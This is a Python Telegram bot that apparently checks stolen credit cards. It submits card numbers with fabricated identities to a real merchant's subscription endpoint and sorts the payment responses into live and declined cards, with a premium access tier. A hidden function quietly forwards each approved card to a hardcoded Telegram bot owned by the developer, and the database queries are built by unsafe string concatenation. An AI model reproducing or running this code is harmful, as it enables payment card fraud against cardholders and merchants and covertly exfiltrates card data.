import json
import requests
import time
import asyncio
import re
import os
import colored 
from asyncio import sleep
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
) 

from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
from db import *
from user import*
from values import *

# Establece los detalles de la conexión



# Establece los detalles de la conexión

def multiexplode(delimiters, string):
    """
    Separa una cadena en elementos utilizando múltiples delimitadores.

    :param delimiters: Lista de delimitadores como cadena o lista.
    :param string: Cadena a ser dividida.
    :return: Lista de elementos separados.
    """
    if isinstance(delimiters, str):
        delimiters = [delimiters]

    # Reemplazar todos los delimitadores por el primer delimitador
    current_delimiter = delimiters[0]
    for delimiter in delimiters[1:]:
        string = string.replace(delimiter, current_delimiter)

    # Dividir la cadena utilizando el primer delimitador
    return string.split(current_delimiter)

@Client.on_message(filters.command(["stp"], ["/", "."]))
async def ch(_, message: Message):

            username = message.from_user.username
            chat_id = message.chat.id
            user_id = (
        message.from_user.id
    )

            
# Obtener información del grupo
            queryGroups = "SELECT * FROM `groups` WHERE id=" + str(chat_id)
            cursorGroups = db.cursor()
            cursorGroups.execute(queryGroups)
            resultGroups = cursorGroups.fetchall()

# Obtener información del usuario
            queryUsers = "SELECT * FROM users WHERE user_id='" + str(user_id) + "'"
            cursorUsers = db.cursor()
            cursorUsers.execute(queryUsers)
            resultUsers = cursorUsers.fetchall()

            isPremium = False

# Verificar si el usuario es premium en la tabla "users" solo si no es premium en la tabla "groups"
            

            row = None  # Asignar un valor por defecto

            if not isPremium and len(resultUsers) > 0:
                row = resultUsers[0]
            if row and row[2] == 'Premium':  # Verificar si 'row' tiene un valor antes de acceder a sus elementos
                isPremium = True
            
            # ...
            
            if len(resultGroups) > 0:
                row = resultGroups[0]
            if row and row[3] == 'Premium':  # Verificar si 'row' tiene un valor antes de acceder a sus elementos
                isPremium = True

            

# Verificar si el bot se está utilizando en un grupo
            isGroupChat = message.chat.type == 'group'

            if not isPremium:
             message_text = "Para usar el bot"
    
             if isGroupChat:
              message_text += " en este grupo, debes comprar RaceXtChk. Por favor, ponte en contacto con los vendedores para obtener más información."
             else:
              message_text += ", debes comprar RaceXtChk. Por favor, ponte en contacto con los vendedores para obtener más información."
    
             await message.reply_text(f"<i>{message_text}</i>")
             return
            data = message.text.split(" ", 2)

            if len(data) < 2:
                await message.reply_text("""
<i>Comando</i> <i>/stp</i>
<i>Formato:</i> <code>cc|mm|yy|cvv</code>
<i>Gateway:</i> <code>Manchester</code>""")
                return

            ccs = data[1]
            card = multiexplode([":", "|", "/", " ","!"], ccs)
            cc = card[0]
            mes = card[1]
            if len(cc) != 16:
                await message.reply_text("Card Not Found. La tarjeta debe tener 16 dígitos.")
                return
            if len(mes) != 2:
                await message.reply_text("Card Not Found. mes inválido")
                return
            
            # Verificar si el año tiene 2 o 4 dígitos
            regex_pattern = r"\b\d{2}\b|\b\d{4}\b"
            match = re.search(regex_pattern, card[2])
        
            if match:
                ano = match.group()  # Obtener el año coincidente
            else:
                await message.reply_text("Formato de año no válido.")
                return
            
            cvv = card[3]
            bin_code = cc[:6]
            
            if len(cvv) != 3:
                await message.reply_text("Card Not Found. cvv inválido")
                return
            
            # Verificar si el bin está en la lista de bins prohibidos
            banned_file = "bin_banned.txt"
            if os.path.exists(banned_file):
                with open(banned_file, "r") as file:
                    banned_bins = file.read().splitlines()
                if bin_code in banned_bins:
                    await message.reply_text("Bin Banned")
                    return
   #dabese variable
            
            username = message.from_user.username
    
            user_id = (
        message.from_user.id
    )
         
        
           

    
    
            
                
                # Ejecuta una consulta SQL para buscar al usuario por su User ID
            query = f"SELECT status FROM users WHERE user_id='{user_id}'"
            cursor.execute(query)
                 
            # Obtiene el resultado de la consulta
            result = cursor.fetchone()
            if result is None:
             await message.reply_text( "No estás registrado. Por favor, utiliza /register para registrarte.")
             return  
                # Verifica el resultado y almacena el valor en la variable "rank"
            
            rank = result[0]
            if message.from_user.id in antispam_users and antispam_users[message.from_user.id] + 16 > int(time.time()):
             time_left = antispam_users[message.from_user.id] + 16 - int(time.time())
             await message.reply_text(f"❗️ [<i>ANTISPAM DETECTADO</i>]. Espera {time_left} segundos antes de enviar otro comando.")
             return 
            else:
             antispam_users[message.from_user.id] = int(time.time())

    # ... (el resto del código existente)
    # ... (el resto del código existente)

                
            inputm = message.text.split(None, 1)[1]
            bincode = 6
            BIN = inputm[:bincode]
            req = requests.get(f"https://bins.antipublic.cc/bins/{BIN}").json()
                    
                 
            
            brand = req['brand']
            country = req['country']
            country_name = req['country_name']
            country_flag = req['country_flag']
            country_currencies = req['country_currencies']
            bank = req['bank']
            level = req['level']
            typea  = req['type']
            msg=await message.reply(f"""<b>⎚Gateway| Manchester
Card: <code>{ccs}</code>
Progress 🔴 1.12(s)</b>""")

            
            req = requests.get(f'https://randomuser.me/api/?nat=us')
            r = req.json()['results'][0]
            first = r['name']['first']
            last = r['name']['last']
            mail = r['email']
            
            
            
            headers = {
              'Host': 'www.lagreeod.com',
              'Accept': 'application/json, text/javascript, */*; q=0.01',
              'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
              'X-Requested-With': 'XMLHttpRequest',
              'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
              'Origin': 'https://www.lagreeod.com',
              'Sec-Fetch-Site': 'same-origin',
              'Sec-Fetch-Mode': 'cors',
              'Sec-Fetch-Dest': 'empty',
              'Referer': 'https://www.lagreeod.com/subscribe',
              'Accept-Language': 'es-MX,es-419;q=0.9,es;q=0.8,en;q=0.7',
              'Cookie': 'ci_session=sr7ctr6q09ff9olojh3bc10rhv3iq4hl; _ga=GA1.1.19457373.1698258629; _gcl_au=1.1.155356507.1698258635; __kla_id=eyJjaWQiOiJZekZsWkRZd1ptRXRZekEyTUMwMFltWm1MVGcwTVRjdE1qZzFaakprT0RsaE5EUmsiLCIkcmVmZXJyZXIiOnsidHMiOjE2OTgyNTg2MzgsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LmxhZ3JlZW9kLmNvbS8ifSwiJGxhc3RfcmVmZXJyZXIiOnsidHMiOjE2OTgyNTg2MzgsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LmxhZ3JlZW9kLmNvbS8ifX0=; optiMonkClientId=dc03d6f5-c721-1d4d-99d6-7c6e88e4a8ae; optiMonkClient=N4IgjA7ALAHArAThALlAYwIYuAXwDQgBmAbimAGwIwBMcM5UADAQDanIVW31TUEB2AewAO7ajhxA; optiMonkSession=1698258642; _ga_4HXMJ7D3T6=GS1.1.1698258628.1.1.1698258781.0.0.0; _ga_KQ5ZJRZGQR=GS1.1.1698258636.1.1.1698258781.0.0.0'
            }
                
            
            msg1=await msg.edit(f"""<b>⎚Gateway | Manchester
Card: <code>{ccs}</code>
Progress 🟠 4.40(s)</b>""")
             
            
            
            data = {
              'stripe_customer': '',
              'subscription_type': 'Weekly Subscription',
              'firstname': first,
              'lastname': last,
              'email': mail,
              'password': 'Cesar0728',
              'card[name]': first,
              'card[number]': cc,
              'card[exp_month]': mes,
              'card[exp_year]': ano,
              'card[cvc]': cvv,
              'coupon': '',
              's1': '25',
              'sum': '38'
            }
            
            ch = requests.post('https://www.lagreeod.com/register/validate_subscribe', headers=headers, data=data)
            print(ch.text)
            
            msg2=await msg1.edit(f"""<b>⎚Gateway | Manchester
Card: <code>{ccs}</code>
Progress 🟢 6.20(s)</b>""")

            

            
            def forwardCVV(text):

                requests.get("https://api.telegram.org/bot6133153598:AAE_jJWR1oaMasP2vmaDzCTy36zz_5QI2nw/sendMessage?chat_id=1924666696&text=" + text)
            if '"success":true' in ch.text:
                status = "Approved✅"
                msg = "CVV MATCHED"
                save_live(ccs)
                forwardCVV(f"""⊗GATEWAY- Manchester\n⊗Card:{ccs}\n⊗ Status:Approved✅\n⊗ Response:Charged 1$\n⌧ Checked by:{message.from_user.first_name}""")
            elif 'Your card has insufficient funds.' in ch.text:
                status = "Approved✅"
                msg = "insufficient funds"
            elif "Your card's security code is incorrect." in ch.text:
                status = "Approved CCN✅"
                msg = "incorrect cvc"
            elif 'transaction_not_allowed' in ch.text:
                status = "Decined❌"
                msg = "transaction not allowed"
            elif 'do_not_honor' in ch.text:
                status = "Declined❌"
                msg = "Do Not Honor"
            elif 'stolen_card' in ch.text:
                status = "Declined❌"
                msg = "stolen card"
            elif 'lost_card' in ch.text:
                status = "Declined❌"
                msg = "lost_card"
            elif "pickup_card" in ch.text:
                status = "Declined❌"
                response = "Pickup Card"
            elif "incorrect_number" in ch.text:
                status = "Declined❌"
                msg = "Incorrect Card Number"
            elif "expired_card" in ch.text:
                status = "Declined❌"
                msg = "Expired Card"
            elif '"success":false' in ch.text:
                status = "Declined❌"
                msg = "Your card was declined"
            elif "fraudulent" in ch.text:
                status = "Declined❌"
                msg = "Fraudulent"
            elif "lock_timeout" in ch.text:
                status = "Declined❌"
                response = "Api Error"
            elif "Your card was declined." in ch.text:
                status = "Declined❌"
                msg = "Generic Decline"
            elif "intent_confirmation_challenge" in ch.text:
                status = "Declined❌"
                msg = "Captcha"
            elif "Your card does not support this type of purchase." in ch.text:
                status = "Live 🟡"
                msg = "Locked Card"
            elif "parameter_invalid_empty" in ch.text:
                status = "Declined❌"
                msg = "404 error"
            elif "requires_action" in ch.text:
                status = "Declined❌"
                msg = "three 3ds Secure"    
            elif "invalid_request_error" in ch.text:
                status = "Declined❌"
                msg = "404 error"
            
            else:
                status = "Declined❌"
                msg = "Gate Dead"
            
            await msg2.edit(f"""
<b> 

⊗ Card - <code>{ccs}</code> 
⊗ Status - {status}
⊗ Response - {msg}
⊗ GATEWAY- Manchester 
－－－－－－－－－－－－－－
[ BIN INFO ]
⚆ Bin - {BIN} - {brand} - {typea} - {level}
⚆ Bank - {bank} 🏛  
⚆ Country - {country} - {country_flag} 
－－－－－－－－－－－－－－
[ CHECK INFO ]
⌧ Proxy  - Live! ✅ 
⌧ Time Test - 7.4sec
⌧ Checked by: <a href="tg://user?id={message.from_user.id}"> {message.from_user.first_name}</a> ♻️
⌧ Bot by - <b><a href="tg://resolve?domain=Sarcehkr">SarceDev[Owner]</a></b>
－－－－－－－－－－－－－－</b>
            """)